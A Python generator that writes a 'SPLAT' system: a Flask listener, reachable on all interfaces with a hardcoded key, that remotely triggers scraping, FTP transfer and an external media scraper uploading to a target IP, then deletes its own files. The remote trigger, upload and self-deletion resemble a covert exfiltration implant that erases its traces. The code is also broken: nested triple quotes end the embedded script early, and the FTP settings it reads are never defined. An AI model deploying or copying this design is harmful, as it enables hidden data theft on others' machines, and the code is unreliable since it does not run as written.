import os
import subprocess
import shutil

# Paths for required files
BASE_DIR = os.getcwd()
SPLAT_BAT_PATH = os.path.join(BASE_DIR, "SPLAT.bat")
SPLAT_MAIN_PATH = os.path.join(BASE_DIR, "splat_main.py")
REQUIREMENTS_PATH = os.path.join(BASE_DIR, "requirements.txt")

# SPLAT Configuration (main system script)
SPLAT_MAIN_CONTENT = """import os
import time
import threading
from flask import Flask, request, jsonify
from datetime import datetime, timedelta
import requests  # For web scraping
import ftplib  # For FTP operations
import webbrowser  # To open files or URLs
import subprocess  # For running external scripts
import shutil  # For file and folder deletion

# SPLAT Configuration
config = {
    "trigger_mode": "pinged",  # Options: "timed" or "pinged"
    "trigger_time": "2025-01-11 18:00:00",  # Time to execute (used if "timed")
    "ping_endpoint": "/trigger_splat",  # Endpoint to trigger (used if "pinged")
    "auth_key": "secure_key_123",  # Key for authentication
    "containers": {  # Define executable containers
        "open_image": {"type": "open_file", "path": "example.jpg"},
        "web_scraper": {"type": "scrape", "url": "https://example.com"},
        "ftp_transfer": {
            "type": "ftp",
            "action": "download",  # "upload" or "download"
            "remote_file": "/remote/example.txt",
            "local_file": "downloaded_example.txt",
        },
        "external_script": {
            "type": "external_script",
            "script_path": "media_scraper_server_config.py",  # External script path
            "target_ip": "192.168.1.1",  # Target IP for upload
        },
        "auto_delete": {
            "type": "auto_delete",
            "paths_to_delete": [
                "SPLAT", "containers", "cache",  # Paths to be deleted
            ],
        },
    },
}

# Action Handlers
def execute_open_file(path):
    """Open a file using the default system application."""
    if os.path.exists(path):
        print(f"[SPLAT] Opening file: {path}")
        webbrowser.open(path)
    else:
        print(f"[SPLAT] File not found: {path}")

def execute_scrape(url):
    """Perform a simple web scrape."""
    try:
        print(f"[SPLAT] Scraping URL: {url}")
        response = requests.get(url)
        if response.status_code == 200:
            print(f"[SPLAT] Content from {url}:\n{response.text[:500]}")  # Print first 500 chars
        else:
            print(f"[SPLAT] Failed to scrape {url}. Status code: {response.status_code}")
    except Exception as e:
        print(f"[SPLAT] Error during scraping: {e}")

def execute_ftp(action, remote_file, local_file):
    """Perform FTP operations (upload/download)."""
    try:
        print(f"[SPLAT] FTP Action: {action}, Remote File: {remote_file}, Local File: {local_file}")
        ftp = ftplib.FTP(config["containers"]["ftp_transfer"]["server"])
        ftp.login(config["containers"]["ftp_transfer"]["username"], config["containers"]["ftp_transfer"]["password"])

        if action == "download":
            with open(local_file, "wb") as f:
                ftp.retrbinary(f"RETR {remote_file}", f.write)
        elif action == "upload":
            with open(local_file, "rb") as f:
                ftp.storbinary(f"STOR {remote_file}", f)
        else:
            print("[SPLAT] Invalid FTP action")
        ftp.quit()
    except Exception as e:
        print(f"[SPLAT] FTP error: {e}")

def execute_external_script(script_path, target_ip):
    """Execute the external Python script (media scraper) with specified IP address."""
    try:
        print(f"[SPLAT] Executing media scraper script: {script_path}")
        subprocess.run(["python", script_path, target_ip], check=True)
        print("[SPLAT] Media scraping and upload completed.")
        
        # Once the media scraping is completed, trigger the auto-delete container
        print("[SPLAT] Triggering cleanup (auto-delete) after media scraper completes.")
        execute_container("auto_delete")
    except Exception as e:
        print(f"[SPLAT] Error executing media scraper script: {e}")

def execute_auto_delete(paths_to_delete):
    """Delete the specified paths (SPLAT, containers, cache)."""
    try:
        for path in paths_to_delete:
            if os.path.exists(path):
                if os.path.isdir(path):
                    shutil.rmtree(path)
                    print(f"[SPLAT] Deleted directory: {path}")
                else:
                    os.remove(path)
                    print(f"[SPLAT] Deleted file: {path}")
            else:
                print(f"[SPLAT] Path not found: {path}")
    except Exception as e:
        print(f"[SPLAT] Error during auto-delete: {e}")

# Container Execution
def execute_container(container_name):
    """Executes a container operation."""
    container = config["containers"].get(container_name)
    if not container:
        print(f"[SPLAT] Container '{container_name}' not found.")
        return

    container_type = container["type"]
    if container_type == "open_file":
        execute_open_file(container["path"])
    elif container_type == "scrape":
        execute_scrape(container["url"])
    elif container_type == "ftp":
        execute_ftp(
            action=container["action"],
            remote_file=container["remote_file"],
            local_file=container["local_file"],
        )
    elif container_type == "external_script":
        execute_external_script(
            script_path=container["script_path"],
            target_ip=container["target_ip"]
        )
    elif container_type == "auto_delete":
        execute_auto_delete(container["paths_to_delete"])
    else:
        print(f"[SPLAT] Unknown container type: {container_type}")

# Ping Trigger
def setup_ping_trigger():
    """Sets up a Flask server to listen for pings to trigger containers."""
    app = Flask(__name__)

    @app.route(config["ping_endpoint"], methods=["POST"])
    def trigger():
        auth = request.headers.get("Authorization")
        if auth != config["auth_key"]:
            return jsonify({"error": "Unauthorized"}), 403

        container_name = request.json.get("container_name")
        if container_name:
            threading.Thread(target=execute_container, args=(container_name,)).start()
            return jsonify({"message": f"Container '{container_name}' triggered."})
        else:
            return jsonify({"error": "No container specified."}), 400

    app.run(host="0.0.0.0", port=5000)

# Main Function
if __name__ == "__main__":
    print("[SPLAT] Starting...")
    if config["trigger_mode"] == "timed":
        print("[SPLAT] Timed mode is not implemented for containers.")
    elif config["trigger_mode"] == "pinged":
        print(f"[SPLAT] Listening for pings at endpoint: {config['ping_endpoint']}")
        setup_ping_trigger()
    else:
        print("[SPLAT] Invalid trigger mode. Exiting.")
"""

# SPLAT.bat file content (for Windows)
SPLAT_BAT_CONTENT = """@echo off
REM Activate Python Environment (Adjust if using a virtualenv)
python -m venv splat_env
call splat_env\\Scripts\\activate.bat

REM Install required dependencies
pip install -r requirements.txt

REM Run SPLAT Python script
python splat_main.py

REM Deactivate the virtual environment
deactivate
pause
"""

# Requirements.txt content (needed for dependencies)
REQUIREMENTS_CONTENT = """flask
requests
"""

def create_splat_system():
    try:
        # Step 1: Write SPLAT Main Python Script
        with open(SPLAT_MAIN_PATH, "w") as file:
            file.write(SPLAT_MAIN_CONTENT)
        
        # Step 2: Write requirements.txt
        with open(REQUIREMENTS_PATH, "w") as file:
            file.write(REQUIREMENTS_CONTENT)
        
        # Step 3: Write the batch script (SPLAT.bat)
        with open(SPLAT_BAT_PATH, "w") as file:
            file.write(SPLAT_BAT_CONTENT)

        print(f"SPLAT system created successfully!\n"
              f"Main script: {SPLAT_MAIN_PATH}\n"
              f"Batch file: {SPLAT_BAT_PATH}\n"
              f"Requirements: {REQUIREMENTS_PATH}")

        print("To run SPLAT:\n1. Install dependencies using 'pip install -r requirements.txt'\n2. Run SPLAT.bat to start the system.")

    except Exception as e:
        print(f"Error creating SPLAT system: {e}")

if __name__ == "__main__":
    create_splat_system()
